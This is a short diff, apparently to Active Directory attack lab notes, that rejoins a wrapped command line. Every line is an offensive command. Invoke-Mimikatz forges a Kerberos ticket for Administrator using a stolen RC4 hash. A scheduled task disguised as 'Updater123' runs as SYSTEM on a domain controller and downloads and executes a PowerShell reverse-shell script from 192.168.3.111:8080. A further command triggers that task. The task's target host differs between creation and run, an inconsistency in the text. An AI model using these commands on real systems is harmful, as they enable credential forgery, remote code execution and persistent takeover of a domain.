@@ -40,8 +40,6 @@ Invoke-Mimikatz -Command '"kerberos::golden
 538555522 /target:dc01.ecorp.local /service:HOST 
 /rc4:731a061e57100b658bc59d71f5176e93 /user:Administrator /ptt"
 
-schtasks /create /S dc01.ecorp.local
-/SC Weekly /RU "NT Authority\SYSTEM" /TN "Updater123" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.3.111:808
-0/Invoke-PowerShellTcp.ps1''')'"
+schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Updater123" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.3.111:8080/Invoke-PowerShellTcp.ps1'')'"
 
 schtasks /Run /S dc01.ecorp.moneycorp.local /TN "Updater123"
